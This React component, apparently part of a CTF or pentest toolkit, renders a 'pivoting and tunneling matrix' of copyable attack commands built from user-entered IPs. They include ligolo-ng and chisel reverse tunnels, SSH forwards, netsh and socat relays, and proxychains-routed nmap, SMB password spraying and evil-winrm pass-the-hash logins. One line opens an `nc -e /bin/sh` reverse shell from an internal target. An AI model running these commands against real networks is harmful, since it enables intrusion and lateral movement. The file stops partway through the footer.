import React, { useState, useEffect, useRef } from 'react';
import { createPortal } from 'react-dom';
import { motion, AnimatePresence } from 'framer-motion';
import {
  X,
  Network,
  Copy,
  Check,
  Terminal,
  ArrowRight,
  Shield,
  Zap,
  Globe,
  Sliders,
  Cpu,
  Layers,
  ChevronRight,
  ExternalLink
} from 'lucide-react';
import { useCtfStore } from '../../store/useCtfStore';
import { playCyberSound, safeCopyToClipboard } from '../../utils/helpers';
import { useModalA11y } from '../../hooks/useModalA11y';

interface PivotingMatrixModalProps {
  isOpen: boolean;
  onClose: () => void;
}

type PivotTool = 'ligolo' | 'chisel' | 'ssh' | 'netsh-socat' | 'proxychains';

export const PivotingMatrixModal: React.FC<PivotingMatrixModalProps> = ({ isOpen, onClose }) => {
  const { globalVars, setGlobalVars, soundEnabled } = useCtfStore();
  const [activeTool, setActiveTool] = useState<PivotTool>('ligolo');
  const modalContainerRef = useRef<HTMLDivElement>(null);

  useModalA11y({
    isOpen,
    onClose,
    modalRef: modalContainerRef,
  });

  // Parameters
  const [lhost, setLhost] = useState(globalVars.lhost || '10.10.14.x');
  const [lport, setLport] = useState(globalVars.lport || '11601');
  const [targetIp, setTargetIp] = useState(globalVars.targetIp || '10.10.10.x');
  const [internalSubnet, setInternalSubnet] = useState('172.16.1.0/24');
  const [internalTargetIp, setInternalTargetIp] = useState('172.16.1.10');
  const [internalPort, setInternalPort] = useState('80');
  const [forwardPort, setForwardPort] = useState('8080');
  const [socksPort, setSocksPort] = useState('1080');
  const [sshUser, setSshUser] = useState('root');

  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Sync with globalVars when modal opens
  useEffect(() => {
    if (isOpen) {
      if (globalVars.lhost) setLhost(globalVars.lhost);
      if (globalVars.targetIp) setTargetIp(globalVars.targetIp);
      if (globalVars.lport) setLport(globalVars.lport);
    }
  }, [isOpen, globalVars]);

  const handleCopy = async (cmd: string, id: string) => {
    await safeCopyToClipboard(cmd);
    setCopiedId(id);
    if (soundEnabled) playCyberSound('copy');
    setTimeout(() => {
      setCopiedId((prev) => (prev === id ? null : prev));
    }, 2000);
  };

  if (!isOpen) return null;

  return createPortal(
    <div
      className="fixed inset-0 z-[130] flex items-center justify-center p-3 sm:p-6 bg-black/80 backdrop-blur-sm overflow-y-auto"
      onClick={(e) => {
        if (e.target === e.currentTarget) onClose();
      }}
    >
      <motion.div
        initial={{ opacity: 0, scale: 0.95, y: 10 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.95, y: 10 }}
        transition={{ duration: 0.15 }}
        ref={modalContainerRef}
        className="w-full max-w-5xl max-h-[92vh] flex flex-col rounded-2xl border border-slate-200 dark:border-cyber-border bg-white dark:bg-cyber-card shadow-2xl overflow-hidden my-auto"
        onClick={(e) => e.stopPropagation()}
        role="dialog"
        aria-modal="true"
        aria-labelledby="pivoting-matrix-title"
      >
        {/* Header Bar */}
        <div className="flex-shrink-0 flex items-center justify-between border-b border-slate-200 dark:border-cyber-border p-4 bg-slate-50 dark:bg-cyber-bg/95">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-xl bg-purple-100 dark:bg-purple-950/50 border border-purple-300 dark:border-purple-800 text-purple-700 dark:text-purple-400">
              <Network className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 id="pivoting-matrix-title" className="text-base sm:text-lg font-bold text-slate-900 dark:text-white font-mono tracking-wide">
                  TACTICAL PIVOTING & TUNNELING MATRIX
                </h2>
                <span className="text-[10px] px-2 py-0.5 rounded-full font-mono font-bold bg-cyan-100 dark:bg-cyber-cyan/15 text-cyan-900 dark:text-cyber-cyan border border-cyan-300 dark:border-cyber-cyan/40">
                  LIGOLO / CHISEL / SSH
                </span>
              </div>
              <p className="text-xs text-slate-500 dark:text-cyber-muted mt-0.5">
                Dynamic offensive routing, SOCKS5 proxies, reverse tunnels, and multi-hop network traversal.
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-1.5 rounded-lg bg-slate-100 dark:bg-cyber-card border border-slate-200 dark:border-cyber-border text-slate-500 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white transition-colors"
            title="Close modal"
            aria-label="Close modal"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Global Parameter Controls Bar */}
        <div className="flex-shrink-0 border-b border-slate-200 dark:border-cyber-border bg-slate-100/70 dark:bg-cyber-bg/60 p-3 px-4 font-mono text-xs">
          <div className="text-[10px] uppercase font-bold text-purple-700 dark:text-purple-400 mb-2 flex items-center gap-1.5">
            <Sliders className="w-3 h-3" /> PIVOT TOPOLOGY CONFIGURATION (DYNAMIC INTERPOLATION)
          </div>
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-2">
            <div>
              <label className="text-[9px] text-slate-500 dark:text-cyber-muted block uppercase font-bold mb-0.5">
                KALI IP ($LHOST)
              </label>
              <input
                type="text"
                value={lhost}
                onChange={(e) => {
                  setLhost(e.target.value);
                  setGlobalVars({ lhost: e.target.value });
                }}
                className="w-full px-2 py-1 rounded bg-white dark:bg-cyber-card border border-slate-300 dark:border-cyber-border text-slate-900 dark:text-white text-xs font-mono focus:border-cyan-500 focus:outline-none"
                placeholder="10.10.14.x"
              />
            </div>

            <div>
              <label className="text-[9px] text-slate-500 dark:text-cyber-muted block uppercase font-bold mb-0.5">
                PIVOT IP ($TARGET)
              </label>
              <input
                type="text"
                value={targetIp}
                onChange={(e) => setTargetIp(e.target.value)}
                className="w-full px-2 py-1 rounded bg-white dark:bg-cyber-card border border-slate-300 dark:border-cyber-border text-slate-900 dark:text-white text-xs font-mono focus:border-cyan-500 focus:outline-none"
                placeholder="10.10.10.x"
              />
            </div>

            <div>
              <label className="text-[9px] text-slate-500 dark:text-cyber-muted block uppercase font-bold mb-0.5">
                INTERNAL SUBNET
              </label>
              <input
                type="text"
                value={internalSubnet}
                onChange={(e) => setInternalSubnet(e.target.value)}
                className="w-full px-2 py-1 rounded bg-white dark:bg-cyber-card border border-slate-300 dark:border-cyber-border text-slate-900 dark:text-white text-xs font-mono focus:border-cyan-500 focus:outline-none"
                placeholder="172.16.1.0/24"
              />
            </div>

            <div>
              <label className="text-[9px] text-slate-500 dark:text-cyber-muted block uppercase font-bold mb-0.5">
                INTERNAL HOST
              </label>
              <input
                type="text"
                value={internalTargetIp}
                onChange={(e) => setInternalTargetIp(e.target.value)}
                className="w-full px-2 py-1 rounded bg-white dark:bg-cyber-card border border-slate-300 dark:border-cyber-border text-slate-900 dark:text-white text-xs font-mono focus:border-cyan-500 focus:outline-none"
                placeholder="172.16.1.10"
              />
            </div>

            <div>
              <label className="text-[9px] text-slate-500 dark:text-cyber-muted block uppercase font-bold mb-0.5">
                FORWARD / DST PORT
              </label>
              <div className="flex items-center gap-1">
                <input
                  type="text"
                  value={internalPort}
                  onChange={(e) => setInternalPort(e.target.value.replace(/\D/g, '').slice(0, 5))}
                  className="w-1/2 px-2 py-1 rounded bg-white dark:bg-cyber-card border border-slate-300 dark:border-cyber-border text-slate-900 dark:text-white text-xs font-mono focus:border-cyan-500 focus:outline-none"
                  placeholder="80"
                  title="Internal Service Port"
                />
                <input
                  type="text"
                  value={forwardPort}
                  onChange={(e) => setForwardPort(e.target.value.replace(/\D/g, '').slice(0, 5))}
                  className="w-1/2 px-2 py-1 rounded bg-white dark:bg-cyber-card border border-slate-300 dark:border-cyber-border text-slate-900 dark:text-white text-xs font-mono focus:border-cyan-500 focus:outline-none"
                  placeholder="8080"
                  title="Local Listen Port"
                />
              </div>
            </div>

            <div>
              <label className="text-[9px] text-slate-500 dark:text-cyber-muted block uppercase font-bold mb-0.5">
                SOCKS PORT
              </label>
              <input
                type="text"
                value={socksPort}
                onChange={(e) => setSocksPort(e.target.value.replace(/\D/g, '').slice(0, 5))}
                className="w-full px-2 py-1 rounded bg-white dark:bg-cyber-card border border-slate-300 dark:border-cyber-border text-slate-900 dark:text-white text-xs font-mono focus:border-cyan-500 focus:outline-none"
                placeholder="1080"
              />
            </div>
          </div>
        </div>

        {/* Tab Selector */}
        <div className="flex-shrink-0 flex items-center border-b border-slate-200 dark:border-cyber-border bg-slate-50 dark:bg-cyber-bg/80 px-4 overflow-x-auto">
          {[
            { id: 'ligolo', label: '1. Ligolo-ng (TUN Pivot)', icon: Zap, badge: 'Recommended' },
            { id: 'chisel', label: '2. Chisel (Reverse SOCKS5)', icon: Network, badge: 'HTTP/WS' },
            { id: 'ssh', label: '3. SSH Dynamic / Port Forward', icon: Terminal, badge: 'Native' },
            { id: 'netsh-socat', label: '4. Netsh & Socat Relays', icon: Layers, badge: 'Windows/Linux' },
            { id: 'proxychains', label: '5. Proxychains Configuration', icon: Globe, badge: 'Config' },
          ].map((tab) => {
            const Icon = tab.icon;
            const isSelected = activeTool === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTool(tab.id as PivotTool)}
                className={`flex items-center gap-2 py-3 px-4 font-mono font-bold text-xs border-b-2 whitespace-nowrap transition-all ${
                  isSelected
                    ? 'border-purple-600 dark:border-purple-400 text-purple-900 dark:text-purple-300 bg-purple-50 dark:bg-purple-950/20'
                    : 'border-transparent text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white'
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{tab.label}</span>
                <span className="text-[9px] px-1.5 py-0.2 rounded font-mono font-bold bg-slate-200 dark:bg-cyber-card text-slate-700 dark:text-cyber-muted">
                  {tab.badge}
                </span>
              </button>
            );
          })}
        </div>

        {/* Content Body */}
        <div className="flex-1 overflow-y-auto p-4 sm:p-6 space-y-6 font-mono text-xs">
          {/* LIGOLO-NG */}
          {activeTool === 'ligolo' && (
            <div className="space-y-6">
              <div className="p-4 rounded-xl bg-purple-500/10 border border-purple-500/20 space-y-1">
                <div className="text-purple-800 dark:text-purple-300 font-bold flex items-center gap-2 text-sm">
                  <Zap className="w-4 h-4" /> Ligolo-ng: True Layer 3 TUN Routing
                </div>
                <p className="text-slate-600 dark:text-cyber-muted text-xs leading-relaxed font-sans">
                  Ligolo-ng sets up a virtual TUN interface on your Kali machine. Packets routed through <code className="text-purple-700 dark:text-purple-300 font-mono">ligolo</code> are encapsulated over TLS to the agent on the pivot host, allowing direct nmap SYN scans, crackmapexec, and ICMP without proxychains!
                </p>
              </div>

              {/* Step 1 */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span className="flex items-center gap-2">
                    <span className="w-5 h-5 rounded-full bg-purple-600 text-white flex items-center justify-center text-[10px]">1</span>
                    <span>Kali: Create TUN Interface & Launch Ligolo Proxy</span>
                  </span>
                  <button
                    onClick={() => handleCopy(`sudo ip tuntap add user $USER mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:${lport}`, 'ligolo-step1')}
                    className="flex items-center gap-1 text-[11px] text-purple-700 dark:text-purple-400 hover:underline"
                  >
                    {copiedId === 'ligolo-step1' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>{copiedId === 'ligolo-step1' ? 'Copied' : 'Copy Block'}</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-emerald-400 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# 1. Create TUN interface (Kali)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# 2. Run Ligolo proxy server listening on port ${lport}
./proxy -selfcert -laddr 0.0.0.0:${lport}`}
                </pre>
              </div>

              {/* Step 2 */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span className="flex items-center gap-2">
                    <span className="w-5 h-5 rounded-full bg-purple-600 text-white flex items-center justify-center text-[10px]">2</span>
                    <span>Pivot Target: Connect Agent to Kali</span>
                  </span>
                  <div className="flex items-center gap-3">
                    <button
                      onClick={() => handleCopy(`./agent -connect ${lhost}:${lport} -ignore-cert`, 'ligolo-agent-linux')}
                      className="flex items-center gap-1 text-[11px] text-purple-700 dark:text-purple-400 hover:underline"
                    >
                      {copiedId === 'ligolo-agent-linux' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>Linux Agent</span>
                    </button>
                    <button
                      onClick={() => handleCopy(`agent.exe -connect ${lhost}:${lport} -ignore-cert`, 'ligolo-agent-win')}
                      className="flex items-center gap-1 text-[11px] text-purple-700 dark:text-purple-400 hover:underline"
                    >
                      {copiedId === 'ligolo-agent-win' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>Windows Agent</span>
                    </button>
                  </div>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-cyan-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Linux Pivot Host:
./agent -connect ${lhost}:${lport} -ignore-cert

# Windows Pivot Host:
agent.exe -connect ${lhost}:${lport} -ignore-cert`}
                </pre>
              </div>

              {/* Step 3 */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span className="flex items-center gap-2">
                    <span className="w-5 h-5 rounded-full bg-purple-600 text-white flex items-center justify-center text-[10px]">3</span>
                    <span>Kali Ligolo Console: Start Session & Add Subnet Route</span>
                  </span>
                  <button
                    onClick={() => handleCopy(`session\nstart\nsudo ip route add ${internalSubnet} dev ligolo`, 'ligolo-step3')}
                    className="flex items-center gap-1 text-[11px] text-purple-700 dark:text-purple-400 hover:underline"
                  >
                    {copiedId === 'ligolo-step3' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Commands</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-amber-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Inside Ligolo console:
session                 # Select connected agent
start                   # Start the tunnel

# In a separate Kali terminal, route internal network traffic through ligolo:
sudo ip route add ${internalSubnet} dev ligolo

# Test direct ping/nmap without proxychains!
ping -c 2 ${internalTargetIp}
nmap -sT -Pn -p 22,80,445,3389 ${internalTargetIp}`}
                </pre>
              </div>

              {/* Step 4: Reverse Shell Listener via Pivot */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span className="flex items-center gap-2">
                    <span className="w-5 h-5 rounded-full bg-purple-600 text-white flex items-center justify-center text-[10px]">4</span>
                    <span>Catch Reverse Shells from Internal Network (Reverse Relay)</span>
                  </span>
                  <button
                    onClick={() => handleCopy(`listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 --tcp`, 'ligolo-listener')}
                    className="flex items-center gap-1 text-[11px] text-purple-700 dark:text-purple-400 hover:underline"
                  >
                    {copiedId === 'ligolo-listener' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Listener</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-rose-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# In Ligolo console (forwards port 1234 on pivot host back to Kali nc listener on 4444):
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 --tcp

# On Internal Target (${internalTargetIp}), trigger reverse shell to pivot host IP on port 1234:
nc -e /bin/sh ${targetIp} 1234`}
                </pre>
              </div>
            </div>
          )}

          {/* CHISEL */}
          {activeTool === 'chisel' && (
            <div className="space-y-6">
              <div className="p-4 rounded-xl bg-cyan-500/10 border border-cyan-500/20 space-y-1">
                <div className="text-cyan-800 dark:text-cyan-300 font-bold flex items-center gap-2 text-sm">
                  <Network className="w-4 h-4" /> Chisel: Reverse SOCKS5 & Port Forwarding over HTTP/WebSockets
                </div>
                <p className="text-slate-600 dark:text-cyber-muted text-xs leading-relaxed font-sans">
                  Chisel tunnels TCP/UDP traffic over HTTP/WebSocket channels. The reverse SOCKS5 mode bypasses strict egress firewall rules because the target connects back to your Kali server.
                </p>
              </div>

              {/* Reverse SOCKS5 */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>Scenario A: Reverse SOCKS5 Tunnel (Dynamic Proxy)</span>
                  <button
                    onClick={() => handleCopy(`./chisel server -p 8000 --reverse\n./chisel client ${lhost}:8000 R:${socksPort}:socks`, 'chisel-socks')}
                    className="flex items-center gap-1 text-[11px] text-cyan-700 dark:text-cyber-cyan hover:underline"
                  >
                    {copiedId === 'chisel-socks' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Pair</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-cyan-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# 1. Start Chisel Server on Kali:
./chisel server -p 8000 --reverse

# 2. Connect from Compromised Target (Pivot Host):
./chisel client ${lhost}:8000 R:${socksPort}:socks

# Result: Kali opens 127.0.0.1:${socksPort} as a SOCKS5 proxy!
# Use with proxychains:
proxychains -q nmap -sT -Pn -p 80,445,3389 ${internalTargetIp}`}
                </pre>
              </div>

              {/* Remote Port Forward */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>Scenario B: Forward Internal Target Service to Kali Port ({forwardPort} -&gt; {internalTargetIp}:{internalPort})</span>
                  <button
                    onClick={() => handleCopy(`./chisel client ${lhost}:8000 R:${forwardPort}:${internalTargetIp}:${internalPort}`, 'chisel-rport')}
                    className="flex items-center gap-1 text-[11px] text-cyan-700 dark:text-cyber-cyan hover:underline"
                  >
                    {copiedId === 'chisel-rport' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Client Cmd</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-emerald-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Kali Server:
./chisel server -p 8000 --reverse

# Target Client (forwards internal target port ${internalPort} to Kali port ${forwardPort}):
./chisel client ${lhost}:8000 R:${forwardPort}:${internalTargetIp}:${internalPort}

# Now access internal service directly on Kali:
curl http://127.0.0.1:${forwardPort}`}
                </pre>
              </div>

              {/* Local Port Forward */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>Scenario C: Local Port Forward from Pivot Host to Kali</span>
                  <button
                    onClick={() => handleCopy(`./chisel client ${lhost}:8000 ${forwardPort}:127.0.0.1:${internalPort}`, 'chisel-lport')}
                    className="flex items-center gap-1 text-[11px] text-cyan-700 dark:text-cyber-cyan hover:underline"
                  >
                    {copiedId === 'chisel-lport' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Client Cmd</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-amber-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Kali Server:
./chisel server -p 8000

# Client on Target:
./chisel client ${lhost}:8000 ${forwardPort}:127.0.0.1:${internalPort}`}
                </pre>
              </div>
            </div>
          )}

          {/* SSH TUNNELING */}
          {activeTool === 'ssh' && (
            <div className="space-y-6">
              <div className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/20 space-y-1">
                <div className="text-emerald-800 dark:text-emerald-300 font-bold flex items-center gap-2 text-sm">
                  <Terminal className="w-4 h-4" /> Native OpenSSH Tunneling & Multi-Hop Traversal
                </div>
                <p className="text-slate-600 dark:text-cyber-muted text-xs leading-relaxed font-sans">
                  Utilize native SSH capabilities on compromised hosts without dropping new binaries. Supports Dynamic SOCKS5 (-D), Local forwarding (-L), Remote forwarding (-R), and ProxyJump (-J).
                </p>
              </div>

              {/* Dynamic SOCKS5 */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>1. Dynamic Port Forwarding (SOCKS5 Proxy via Pivot)</span>
                  <button
                    onClick={() => handleCopy(`ssh -N -D ${socksPort} ${sshUser}@${targetIp}`, 'ssh-dynamic')}
                    className="flex items-center gap-1 text-[11px] text-emerald-700 dark:text-cyber-emerald hover:underline"
                  >
                    {copiedId === 'ssh-dynamic' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Command</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-emerald-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Creates SOCKS5 listener on Kali 127.0.0.1:${socksPort}:
ssh -N -D ${socksPort} ${sshUser}@${targetIp}

# In background (-f):
ssh -f -N -D ${socksPort} ${sshUser}@${targetIp}`}
                </pre>
              </div>

              {/* Local Port Forward */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>2. Local Port Forward (-L KaliPort:InternalHost:InternalPort)</span>
                  <button
                    onClick={() => handleCopy(`ssh -N -L ${forwardPort}:${internalTargetIp}:${internalPort} ${sshUser}@${targetIp}`, 'ssh-local')}
                    className="flex items-center gap-1 text-[11px] text-emerald-700 dark:text-cyber-emerald hover:underline"
                  >
                    {copiedId === 'ssh-local' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Command</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-cyan-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Access internal service on Kali 127.0.0.1:${forwardPort}:
ssh -N -L ${forwardPort}:${internalTargetIp}:${internalPort} ${sshUser}@${targetIp}`}
                </pre>
              </div>

              {/* Remote Reverse Port Forward */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>3. Remote / Reverse Port Forward (-R KaliPort:TargetHost:TargetPort)</span>
                  <button
                    onClick={() => handleCopy(`ssh -N -R ${forwardPort}:127.0.0.1:${internalPort} kali@${lhost}`, 'ssh-remote')}
                    className="flex items-center gap-1 text-[11px] text-emerald-700 dark:text-cyber-emerald hover:underline"
                  >
                    {copiedId === 'ssh-remote' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Command</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-amber-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Run ON the pivot target to expose its local service back to Kali port ${forwardPort}:
ssh -N -R ${forwardPort}:127.0.0.1:${internalPort} kali@${lhost}`}
                </pre>
              </div>

              {/* ProxyJump */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>4. Multi-Hop ProxyJump (-J PivotHost)</span>
                  <button
                    onClick={() => handleCopy(`ssh -J ${sshUser}@${targetIp} root@${internalTargetIp}`, 'ssh-jump')}
                    className="flex items-center gap-1 text-[11px] text-emerald-700 dark:text-cyber-emerald hover:underline"
                  >
                    {copiedId === 'ssh-jump' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Command</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-purple-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Jump directly through pivot host into internal host SSH:
ssh -J ${sshUser}@${targetIp} root@${internalTargetIp}`}
                </pre>
              </div>
            </div>
          )}

          {/* NETSH & SOCAT */}
          {activeTool === 'netsh-socat' && (
            <div className="space-y-6">
              <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/20 space-y-1">
                <div className="text-amber-800 dark:text-amber-300 font-bold flex items-center gap-2 text-sm">
                  <Layers className="w-4 h-4" /> Portproxy & Relay Redirection
                </div>
                <p className="text-slate-600 dark:text-cyber-muted text-xs leading-relaxed font-sans">
                  Administrative relays without installing extra tooling. Windows <code className="text-amber-700 dark:text-amber-300 font-mono">netsh interface portproxy</code> works natively with system privileges, and Linux <code className="text-amber-700 dark:text-amber-300 font-mono">socat</code> handles fast bi-directional redirection.
                </p>
              </div>

              {/* Windows Netsh */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>Windows Netsh Interface Portproxy (Run as Administrator)</span>
                  <button
                    onClick={() => handleCopy(`netsh interface portproxy add v4tov4 listenport=${forwardPort} listenaddress=0.0.0.0 connectport=${internalPort} connectaddress=${internalTargetIp}\nnetsh advfirewall firewall add rule name="PivotForward" protocol=TCP dir=in localport=${forwardPort} action=allow`, 'netsh-add')}
                    className="flex items-center gap-1 text-[11px] text-amber-700 dark:text-amber-400 hover:underline"
                  >
                    {copiedId === 'netsh-add' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Commands</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-amber-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# 1. Add port forwarding rule on Windows Pivot Host:
netsh interface portproxy add v4tov4 listenport=${forwardPort} listenaddress=0.0.0.0 connectport=${internalPort} connectaddress=${internalTargetIp}

# 2. Allow firewall port:
netsh advfirewall firewall add rule name="PivotForward" protocol=TCP dir=in localport=${forwardPort} action=allow

# 3. View all active portproxy rules:
netsh interface portproxy show all

# 4. Cleanup when done:
netsh interface portproxy delete v4tov4 listenport=${forwardPort} listenaddress=0.0.0.0`}
                </pre>
              </div>

              {/* Linux Socat */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>Linux Socat Port Forward & Reverse Shell Relay</span>
                  <button
                    onClick={() => handleCopy(`socat TCP4-LISTEN:${forwardPort},fork TCP4:${internalTargetIp}:${internalPort}`, 'socat-fwd')}
                    className="flex items-center gap-1 text-[11px] text-amber-700 dark:text-amber-400 hover:underline"
                  >
                    {copiedId === 'socat-fwd' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Socat Fwd</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-cyan-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Forward internal service through Linux pivot host:
socat TCP4-LISTEN:${forwardPort},fork TCP4:${internalTargetIp}:${internalPort}

# Relay reverse shells from internal target back to Kali:
socat TCP4-LISTEN:4444,fork TCP4:${lhost}:${lport}`}
                </pre>
              </div>
            </div>
          )}

          {/* PROXYCHAINS CONFIGURATION */}
          {activeTool === 'proxychains' && (
            <div className="space-y-6">
              <div className="p-4 rounded-xl bg-blue-500/10 border border-blue-500/20 space-y-1">
                <div className="text-blue-800 dark:text-blue-300 font-bold flex items-center gap-2 text-sm">
                  <Globe className="w-4 h-4" /> Kali Proxychains4 Configuration
                </div>
                <p className="text-slate-600 dark:text-cyber-muted text-xs leading-relaxed font-sans">
                  Route any Linux application (e.g. nmap, crackmapexec, smbclient, evil-winrm, firefox) through your active Chisel or SSH SOCKS5 tunnel.
                </p>
              </div>

              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>/etc/proxychains4.conf Snippet</span>
                  <button
                    onClick={() => handleCopy(`socks5 127.0.0.1 ${socksPort}`, 'proxychains-snippet')}
                    className="flex items-center gap-1 text-[11px] text-blue-700 dark:text-blue-400 hover:underline"
                  >
                    {copiedId === 'proxychains-snippet' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Line</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-blue-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Edit configuration:
sudo nano /etc/proxychains4.conf

# 1. Enable dynamic_chain (comment out strict_chain)
dynamic_chain

# 2. At the very bottom under [ProxyList], add:
socks5 127.0.0.1 ${socksPort}`}
                </pre>
              </div>

              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-slate-900 dark:text-white">
                  <span>Offensive Tool Execution via Proxychains</span>
                  <button
                    onClick={() => handleCopy(`proxychains -q nmap -sT -Pn -p 21,22,80,445,3389 ${internalTargetIp}\nproxychains -q netexec smb ${internalSubnet} -u 'guest' -p ''\nproxychains -q evil-winrm -i ${internalTargetIp} -u administrator -H <NTLM>`, 'proxychains-exec')}
                    className="flex items-center gap-1 text-[11px] text-blue-700 dark:text-blue-400 hover:underline"
                  >
                    {copiedId === 'proxychains-exec' ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copy Attack Block</span>
                  </button>
                </div>
                <pre className="p-3 rounded-xl bg-slate-900 text-emerald-300 overflow-x-auto text-[11px] leading-relaxed border border-slate-800">
{`# Port Scan internal host:
proxychains -q nmap -sT -Pn -p 21,22,80,445,3389 ${internalTargetIp}

# Password spray / discover SMB on internal subnet:
proxychains -q netexec smb ${internalSubnet} -u 'guest' -p ''

# Evil-WinRM into internal Windows host:
proxychains -q evil-winrm -i ${internalTargetIp} -u administrator -p 'Password123'

# Browser navigation (open Firefox through proxy):
proxychains -q firefox http://${internalTargetIp} &`}
                </pre>
              </div>
            </div>
          )}
        </div>

        {/* Modal Footer */}
        <div className="flex-shrink-0 flex items-center justify-between p-3 px-4 border-t border-slate-200 dark:border-cyber-border bg-slate-50 dark:bg-cyber-bg/90 font-mono text-xs">
          <div className="text-[11px] text-slate-500 dark:text-cyber-muted flex items-center gap-1.5">
